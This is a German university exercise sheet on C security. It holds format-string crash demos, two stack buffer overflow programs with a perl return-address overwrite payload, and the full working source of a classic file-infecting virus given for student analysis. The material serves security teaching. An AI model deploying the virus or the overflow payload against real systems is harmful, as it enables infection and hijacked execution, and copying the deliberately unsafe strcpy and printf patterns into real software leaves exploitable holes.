UE: C-Programmieren-Sicherheit / Malware
========================================================================
readme.txt


INHALT
------------------------------------------------------------------------
00 Vorkenntnisse
01 Warum printf(...) gefährlich ist
02 Analyse eines Virusprogrammes



00 Vorkenntnisse
------------------------------------------------------------------------
Segmente eines Prozesses

	................. High Address
	.Environment-Var.
	.Argumente      .
	.................
	.Stack          .
	.  |            .
	.  V            .
	.               .
	.  A            .
	.  |            .
	.Heap           .
	.................
	.Daten Segment  .
	.................
	.Text/Code Segm .	 
	................. Low Address




01 Warum printf(...) gefährlich ist
------------------------------------------------------------------------

Aufgabe 1a)
---------------
/*
aufgabe1a.c
Das folgende korrekte C-Programm 1, erzeugt unter 
Linux Mint 13 Maya die Meldung segmentation fault:
*/

#include <stdio.h>

int main(void){
	printf("%s%s%s%s%s%s%s%s%s%s%s%s\n");
	return 0;
}

1. Erklären Sie dieses Resultat.
2. Sie können z. B. das Output-Log von gdb abgeben, 
	und die Schritte beschreiben, die zu Ihrer Antwort geführt haben.



Aufgabe 1b
---------------
/*
aufgabe1b.c
Das folgende korrekte C-Programm, erzeugt unter Linux eine Folge von
„merkwürdigen“ hexadezimalen Zahlen:
*/

#include <stdio.h>

int main(void){
	printf("%08x.%08x.%08x.%08x.%08x.\n");
	return 0;
}

1. Was bedeuten diese hexadezimalen Zahlen?
2. Auch hier können Sie das Output-Log von gdb abgeben, 
	und die Schritte beschreiben, die zu Ihrer Antwort geführt haben.



bufover0.c
---------------
Bringen Sie das folgende Programm zum Laufen.

/*
*---------------------------------------------------------------------
* bufover0.c
*---------------------------------------------------------------------
* buffer overflow: ein Beispiel
*  
* gcc -Wall -pedantic bufover0.c -o bufover0.exe
*  // overflow wird erkannt!!! 
* 
* gcc -Wall -pedantic -fno-stack-protector bufover0.c -o bufover0.exe
*  // overflow wird NICHT erkannt!!! ---->yy ändert seinen Wert
*---------------------------------------------------------------------*/

#include <stdio.h>

int foo() {
	unsigned int yy = 0;
	char buffer[5]; 
	char ch; 
	int i = 0;

	printf("Say something: ");
	while ((ch = getchar()) != '\n')
		buffer[i++] = ch;
	buffer[i] = '\0';

	printf("You said: %s\n", buffer);
	printf("The variable yy: %d\n", yy);
	return 0;
}

int main() {
	while(1)
		foo();

	return 0;
}




bufover1.c
---------------
Bringen Sie das folgende Programm zum Laufen.


/*
 *---------------------------------------------------------------------
 * bufover1.c
 *---------------------------------------------------------------------
 *
 * gcc -Wall -pedantic -fno-stack-protector bufover1.c -o bufover1.exe
 *
 * ./bufover1.exe `perl -e 'print "A" x 24 . "\x4e\x06\x40\x00"'`
 * 
 *-------------------------------------------------------------------*/

#include <stdio.h>
#include <string.h>


void foo(char *s) {
	char buf[4];

	strcpy(buf, s);
	printf("You entered: %s", buf);
}

void bar() {
	printf("\n\nWhat? I was not supposed to be called!\n\n");
	fflush(stdout);
}

int main(int argc, char *argv[]) {
	if (argc != 2) {
		printf("Usage: %s some_string\n", argv[0]);
		return 2;
	}

	foo(argv[1]);

	return 0;
}







02 Analyse eines Virusprogrammes
------------------------------------------------------------------------
/*
Aufgabe 2: virus.c

Das nächste Programm ist eines der ältesten Viren-Programme 
in der Geschichte der Informatik.
Ursprünglich als Demonstrations-Programm für akademische Diskussionen 
gedacht, beinhaltet es alle Merkmale, die man noch heute in 
moderneren Viren antrifft.
*/

#include <stdio.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/param.h>
#include <sys/wait.h>
#include <unistd.h>
#include <stdlib.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/mman.h>

/* the size of our own executable: please configure */
static int V_OFFSET = 14056;

extern int errno;

void do_infect(int, char **, int);

int
main(int argc, char **argv, char **envp){
	int len;
	int rval;
	int pid, status;
	int fd_r, fd_w;
	char *tmp;
	char buf[BUFSIZ];

	/*
	* sometimes it may be possible to modify argv[0], for example by
	* using zsh’s ARGV0 variable:
	*
	* zsh# ARGV0=foobar ls
	*
	* In that case this virus misbehaves!
	*/
	if ((fd_r = open(argv[0], O_RDONLY)) < 0)
		goto XBAILOUT;
	if (lseek(fd_r, V_OFFSET, SEEK_SET) < 0) {
		close(fd_r);
		goto XBAILOUT;
	}
	if ((tmp = tmpnam(NULL)) == NULL) {
		close(fd_r);
		goto BAILOUT;
	}
	if ((fd_w = open(tmp, O_CREAT | O_TRUNC | O_RDWR, 00700)) < 0)
		goto BAILOUT;
	
	while ((len = read(fd_r, buf, BUFSIZ)) > 0)
		write(fd_w, buf, len);

	close(fd_w);

	/* Infect */
	do_infect(argc, argv, fd_r);

	close(fd_r);

	if ((pid = fork()) < 0)
		goto BAILOUT;

	/* run the original executable */
	if (pid == 0) {
		execve(tmp, argv, envp);
		exit(127);
	}

	do {
		/* wait till you can cleanup */
		if (waitpid(pid, &status, 0) == -1) {
			if (errno != EINTR) {
				rval = -1;
				goto BAILOUT;
			} else {
				rval = status;
				goto BAILOUT;
			}
		}
	} while (1);

BAILOUT:
	unlink(tmp);

XBAILOUT:
	exit(rval);
}


void do_infect(int argc, char **argv, int fd_r) {
	int fd_t;
	int target, i;
	int done, bytes, length;
	void *map;
	struct stat stat;
	char buf[BUFSIZ];

	if (argc < 2)
		return;

	/* nail the first executable on the command line */
	for (target = 1; target < argc; target++)
		if (!access(argv[target], W_OK | X_OK))
			goto NAILED;
	return;

NAILED:
	if ((fd_t = open(argv[target], O_RDWR)) < 0)
		return;
	fstat(fd_t, &stat);
	length = stat.st_size;
	map = (char *)malloc(length);
	if (!map)
		goto OUT;

	/* assume no short reads or writes, nor any failed lseeks */
	for (i = 0; i < length; i++)
		read(fd_t, map + i, 1);
	lseek(fd_t, 0, SEEK_SET);
	if (ftruncate(fd_t, 0))
		goto OUT;
	done = 0;
	lseek(fd_r, 0, SEEK_SET);
	while (done < V_OFFSET) {
		bytes = read(fd_r, buf, 1);
		write(fd_t, buf, bytes);
		done += bytes;
	}
	for (bytes = 0; bytes < length; bytes++)
		write(fd_t, map + bytes, 1);
	free(map);

OUT:
	close(fd_t);
	return;
}



Fragen
------------------------------------------------------------------------
1. Was tut dieses Virus-Programm genau?
2. Warum muss die Variable static int V_OFFSET = 14056; 
	angepasst werden? Nach welchen Kriterien?
3. Wie wird die Virus-Vermehrung technisch implementiert?

4. Versuchen Sie das Programm in einer “aseptischen„ Umgebung zu 
starten, um Ihre Analyse zu überprüfen.

Literatur
[1] Teso Security Group Exploiting Format String Vulnerabilities
http://julianor.tripod.com/bc/formatstring-1.2.pdf


